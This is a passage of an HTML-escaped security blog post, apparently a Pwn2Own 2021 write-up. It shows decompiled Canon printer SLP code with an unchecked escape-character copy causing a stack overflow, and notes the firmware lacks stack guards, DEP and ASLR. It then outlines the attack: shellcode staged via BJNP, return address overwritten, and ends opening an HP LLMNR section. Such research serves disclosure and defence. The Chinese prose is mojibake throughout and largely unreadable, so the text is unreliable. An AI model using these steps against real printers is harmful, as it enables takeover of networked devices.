class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;LOWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;(),&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;!&amp;lt;=&amp;gt;~;*+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1F&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7F&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;(),&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;!&amp;lt;=&amp;gt;~;*+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-----------------------[3]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1F&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7F&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos; &apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_35&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_35:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//----------------------[4] &lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_one&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;LOBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_40:&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;next_one:&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;debugprintff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3645&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Scope longer than buffer provided&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_48:&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdatalen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂèØ‰ª•ÁúãÂà∞ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[3]&lt;/code&gt; ÈáùÂ∞çÊòØÊ≤íÊúâË∑≥ËÑ´Â≠óÂÖÉÁöÑËôïÁêÜÔºåÊúÉÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[4]&lt;/code&gt; Ê™¢Êü•ÊòØÂê¶ÊúâË∂ÖÈÅéÊúÄÂ§ßÈï∑Â∫¶ÔºåÁÑ∂ËÄåÂú®ÊúâË∑≥ËÑ´Â≠óÂÖÉÁöÑËôïÁêÜ‰∏≠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt; Ôºå‰∏¶Ê≤íÊúâ‰ªª‰ΩïÂ∞çÈï∑Â∫¶ÁöÑÊ™¢Êü•ÔºåÁõ¥Êé•Â∞áËΩâÊèõÂæåÁöÑÁµêÊûúÊîæÂà∞ destination buffer ‰∏≠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[2]&lt;/code&gt;Ôºå‰∏ÄÊó¶Áµ¶ÂÆöÁöÑÂ≠ó‰∏≤Â§öÊï∏ÁÇ∫Ë∑≥ËÑ´Â≠óÂÖÉÁöÑÊÉÖÊ≥ÅÔºåÂ∞±ÊúÉÈÄ†Êàê stack overflow„ÄÇ&lt;/p&gt;

&lt;p&gt;Âú®ÊâæÂà∞ÊºèÊ¥û‰πãÂæåÔºåÁ¨¨‰∏Ä‰ª∂‰∫ãÂ∞±ÊòØÂÖàÁúãÁúãÊú¨Ë∫´ÊúâÁîöÈ∫º‰øùË≠∑ÔºåÊñπ‰æøÂæåÁ∫åÁöÑÂà©Áî®„ÄÇ‰ΩÜÂàÜÊûê‰∫Ü‰∏Ä‰∏ãÁôºÁèæÔºåCanon Âç∞Ë°®Ê©üÊú¨Ë∫´‰∏¶Ê≤íÊúâ‰ªª‰ΩïË®òÊÜ∂È´îÁõ∏ÈóúÁöÑ‰øùË≠∑„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;protection&quot;&gt;Protection&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;No Stack Guard&lt;/li&gt;
  &lt;li&gt;No DEP&lt;/li&gt;
  &lt;li&gt;No ASLR&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ê≤íÊúâ Stack Guard„ÄÅÊ≤íÊúâ DEP ‰πüÊ≤íÊúâ ASLRÔºåÂèØ‰ª•Ë™™ÊòØ &lt;strong&gt;hacker friendly&lt;/strong&gt; ! Â¶ÇÂêåÂõûÂà∞ 90 Âπ¥‰ª£Ôºå‰∏ÄÂÄã stack overflow Â∞±ÂèØ‰ª•ÊâìÂ§©‰∏ã„ÄÇÊé•‰∏ã‰æÜÂ∞±Â¶ÇÂêåÈÅéÂæÄÁöÑ Binary Exploitation Âà©Áî®ÊâãÊ≥ïÔºåÊâæÂÄãÂú∞ÊñπÊîæ shellcode ÂÜçË¶ÜËìã return address Ë∑≥Âà∞ shellcode Â∞±ÊúÉÊúâ‰ªªÊÑèÁ®ãÂºèÁ¢ºÂü∑Ë°å‰∫Ü! ÊúÄÁµÇÊàëÂÄëÊâæÂà∞‰∫Ü BJNP ÈÄôÂÄãÊúçÂãô‰æÜÊîæÊàëÂÄëÁöÑ shellcode„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;bjnp&quot;&gt;BJNP&lt;/h4&gt;
&lt;p&gt;BJNP Êú¨Ë∫´‰πüÊòØÂÄãÊúçÂãôÁôºÁèæÂçîÂÆöÔºåÁî± Canon Ëá™Â∑±ÊâÄË®≠Ë®àÔºåÈÅéÂéª‰πüÊõæÁ∂ìÊúâË®±Â§öÊºèÊ¥ûÔºå&lt;a href=&quot;https://www.synacktiv.com/publications/treasure-chest-party-quest-from-doom-to-exploit.html&quot;&gt;Synacktiv&lt;/a&gt; ‰πüÊõæÁ∂ìÂà©Áî®Ë©≤ÂçîÂÆöÊºèÊ¥û‰æÜÁç≤ÂæóÂç∞Ë°®Ê©üÊéßÂà∂Ê¨äÔºåÈÄôÈÇä‰∏çÂ§öÂÅöÁ¥∞ÁØÄ‰∏äÁöÑ‰ªãÁ¥πÔºåÊõ¥Â§öÁ¥∞ÁØÄÂèØÂèÉËÄÉ&lt;a href=&quot;https://doar-e.github.io/blog/2022/06/11/pwn2own-2021-canon-imageclass-mf644cdw-writeup/#bjnp&quot;&gt;ÈÄôÁØá&lt;/a&gt;ÔºåÊàëÂÄë‰πüÁî®‰∫ÜÈ°û‰ººÁöÑÊâãÊ≥ï„ÄÇ BJNP Êú¨Ë∫´ÊúÉÂ∞áÂèØÊéßÁöÑ session Ë≥áÊñôÊîæÂú®Â∑≤Áü•ÁöÑ global buffer ‰∏≠ÔºåÊàëÂÄëÂèØÁî®ÈÄôÂÄãÂäüËÉΩ‰æÜÂ∞áÊàëÂÄëÁöÑ shellcode ÊîæÂà∞‰∏ÄÂÄãÂõ∫ÂÆöÁöÑ‰ΩçÁΩÆ‰∏äÔºåÂü∫Êú¨‰∏ä‰πüÊ≤íÁîöÈ∫ºÈôêÂà∂„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÈáçÊñ∞Êï¥ÁêÜ‰∏Ä‰∏ãÂà©Áî®Ê≠•È©ü&lt;/p&gt;

&lt;h4 id=&quot;exploitation-step&quot;&gt;Exploitation Step&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;‰ΩøÁî® BJNP Â∞áÊàëÂÄëÁöÑ shellcode ÊîæÂà∞Âõ∫ÂÆöÁöÑÂ∑≤Áü•‰ΩçÁΩÆ„ÄÇ&lt;/li&gt;
  &lt;li&gt;Ëß∏Áôº SLP ÁöÑ stack overflow ‰∏¶Ë¶ÜËìã return address&lt;/li&gt;
  &lt;li&gt;Ë∑≥Âà∞ÊàëÂÄëÁöÑ shellcode ‰∏äÂü∑Ë°åÁ®ãÂºèÁ¢º„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;pwn2own-austin-2021-1&quot;&gt;Pwn2Own Austin 2021&lt;/h4&gt;
&lt;p&gt;ÈÄöÂ∏∏ Pwn2Own ‰∏≠ÊúÉÈúÄË¶Å‰Ω†Ë≠âÊòéÂ∑≤Êâì‰∏ãÂç∞Ë°®Ê©üÔºåÈÄôÈÇäÂèØ‰ª•Ëá™Áî±ÈÅ∏ÊìáÂëàÁèæÊñπÂºèÔºåÊàëÂÄëËµ∑ÂàùÊÉ≥Ë¶ÅÁöÑÊòØÂ¶ÇÂêåÊàëÂÄë exploit Lexmark Âç∞Ë°®Ê©ü‰∏ÄÊ®£ÔºåÁõ¥Êé•Â∞á logo ÊîæÂà∞Âç∞Ë°®Ê©üÁöÑ LCD Ëû¢Âπï‰∏ä„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/16.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‰ΩÜÂú®ÊØîË≥ΩÂâçÔºåÊàëÂÄëËä±‰∫ÜÂæàÂ§öÊôÇÈñìÂú®Á†îÁ©∂Ë©≤ÊÄéÈ∫ºÊää logo Âç∞Âà∞Ëû¢Âπï‰∏äÔºåËä±Âú®ÈÄôÈÇäÊôÇÈñìÂèØËÉΩÊØîÊâæÊ¥ûË∑üÂØ´ exploit ÊôÇÈñìÈÇÑË¶ÅÈï∑ÔºåÊúÄÂæå‰πüÂõ†ÁÇ∫ÊôÇÈñì‰∏äÁöÑÂõ†Á¥†ÔºåÊé°Âèñ‰∫ÜÊØîËºÉ‰øùÈö™ÁöÑÂÅöÊ≥ïÔºåÁõ¥Êé•ÊîπÊéâ &lt;a href=&quot;https://doar-e.github.io/blog/2022/06/11/pwn2own-2021-canon-imageclass-mf644cdw-writeup/#service-mode&quot;&gt;Service Mode&lt;/a&gt; Â≠ó‰∏≤ÔºåÂÜçÂç∞Âà∞Ëû¢Âπï‰∏ä„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/17.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‰∏çÈÅéÂØ¶Èöõ‰∏äÂç∞ÂúñÁâáÂà∞Ëû¢Âπï‰∏ä‰∏¶‰∏çÈõ£ÔºåÂÖ∂‰ªñÈöä‰ºçÊúâÊâæÂà∞&lt;a href=&quot;https://doar-e.github.io/blog/2022/06/11/pwn2own-2021-canon-imageclass-mf644cdw-writeup/#displaying-an-image&quot;&gt;ÊñπÊ≥ï&lt;/a&gt;ÔºåÊúâËààË∂£ÁöÑ‰∫∫ÂèØ‰ª•ÂòóË©¶ÁúãÁúã„ÄÇ&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/vQbQImZ3XRw?start=18400&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h4 id=&quot;debug&quot;&gt;Debug&lt;/h4&gt;
&lt;p&gt;ÁúãÂà∞ÈÄôÈÇäÂèØËÉΩÊúÉÊúâ‰∫∫ÊÉ≥ÂïèÈÄôÁ®ÆÁí∞Â¢ÉÂ¶Ç‰Ωï debugÔºåÂØ¶Èöõ‰∏ä‰æÜË™™Ë¶Å debug ÈÄöÂ∏∏ÊúâÂπæÁ®ÆÊñπÊ≥ïÔºö&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Êé•‰∏äÁ°¨È´îÁç≤Âæó debug console ÂæåÔºåÁî®Ë£°Èù¢ÁöÑÂäüËÉΩ‰æÜ debug&lt;/li&gt;
  &lt;li&gt;Áî®ËàäÁöÑÊ¥ûÁç≤ÂæóÁ®ãÂºèÁ¢ºÂü∑Ë°åÂæåÔºåË£ù‰∏äÂÆ¢Ë£ΩÁöÑ debugger&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;‰∏çÈÅéÊàëÂÄëÁï∂ÊôÇÂ∑≤Êõ¥Êñ∞Âà∞ÊúÄÊñ∞ÔºåË©≤ÁâàÊú¨‰∏çÂ≠òÂú®ËàäÁöÑÊºèÊ¥ûÔºåÈúÄË¶ÅÈôçÁâàÊú¨ÂõûÂéªÔºåËÄåÊãÜËß£Á°¨È´îÂêåÊ®£‰πüÈ†àÈ°çÂ§ñÁöÑÊôÇÈñìÔºå‰ΩÜÁï∂ÊôÇÊàëÂÄëÂ∑≤Á∂ìÊúâÊºèÊ¥û‰∫ÜÔºåÊôÇÈñì‰∏ä‰æÜË™™‰∏çÂ§™ÂêàÊàêÊú¨„ÄÇÊúÄÂæåÊàëÂÄëÈÇÑÊòØÊé°Áî®ÊúÄÂÇ≥Áµ±ÁöÑ sleep debug Ê≥ïÂéª debug„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/18.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú® ROP ÊàñÂü∑Ë°å shellcode ÂæåÔºåÂ∞áÁµêÊûúÂç∞Âà∞Á∂≤È†ÅÊàñÂÖ∂‰ªñÂèØË¶ãÁöÑÂú∞ÊñπÔºåÁÑ∂ÂæåÂëºÂè´ sleep ÂæåÔºåÂ∞±ÂèØÂæûÁ∂≤È†ÅÊàñÂÖ∂‰ªñËÆÄÂá∫ÁµêÊûúÔºåÊúÄÂæåÂÜçÈáçÈñãÊ©üÔºåÊé•‰∏ã‰æÜÂ∞±ÊòØ‰∏çÊñ∑ÈáçË§áÊ≠§ÊµÅÁ®ã„ÄÇ‰∏çÈÅéÂØ¶Èöõ‰∏äÊõ¥Â•ΩÁöÑÂÅöÊ≥ïÈÇÑÊòØÊé•‰∏ä debug console ÊúÉÊñπ‰æø‰∏ÄÈªû„ÄÇ&lt;/p&gt;

&lt;p&gt;Êé•‰∏ã‰æÜË¨õË¨õ HP Âç∞Ë°®Ê©ü&lt;/p&gt;

&lt;h3 id=&quot;hp-1&quot;&gt;HP&lt;/h3&gt;

&lt;h4 id=&quot;link-local-multicast-name-resolution&quot;&gt;Link-Local Multicast Name Resolution&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution&quot;&gt;LLMNR&lt;/a&gt; ÊòØËàá mDNS ÈùûÂ∏∏Áõ∏‰ººÁöÑ‰∏ÄÂÄãÂçîÂÆöÔºåÊèê‰æõ‰∫ÜÂçÄÁ∂≤‰∏≠ÁöÑÂüüÂêçËß£ÊûêÂäüËÉΩÔºå‰ΩÜÊØî mDNS Êõ¥ÂñÆÁ¥î‰∏ÄÈªûÔºåÈÄöÂ∏∏‰πüÊúÉÈÖçÂêà‰∏Ä‰∫õÊúçÂãôÁôºÁèæÂçîÂÆö„ÄÇÈÄôÈÇäÁ∞°ÂñÆ‰ªãÁ¥πÊ≠§Ê©üÂà∂Ôºö&lt;/p&gt;

&lt;p&gt;Âú®ÂçÄÁ∂≤ÂüüÂêçËß£ÊûêÊôÇÔºåClient A ÊúÉÂÖàÁî® multicast ÊñπÂºèÔºåÂ∞ãÊâæÂçÄÁ∂≤‰∏≠ Client C ‰ΩçÁΩÆ
&lt;img src=&quot;/assets/img/blog/20231005/19.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú® Client C Êé•Êî∂Âà∞‰πãÂæåÔºåÂâáÊúÉÂõûÂÇ≥Áµ¶ Client AÔºåÁ∞°ÂñÆÂØ¶Áèæ‰∫ÜÂçÄÁ∂≤ÂüüÂêçÁöÑËß£Êûê
&lt;img src=&quot;/assets/img/blog/20231005/20.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ËÄåÂü∫Êú¨‰∏ä LLMNR Â§ßÂ§öÂª∫Á´ãÂú® &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc4795#section-2.1.1&quot;&gt;DNS Â∞ÅÂåÖÊ†ºÂºè&lt;/a&gt; ‰∏äÔºåÊ†ºÂºèÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/21.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

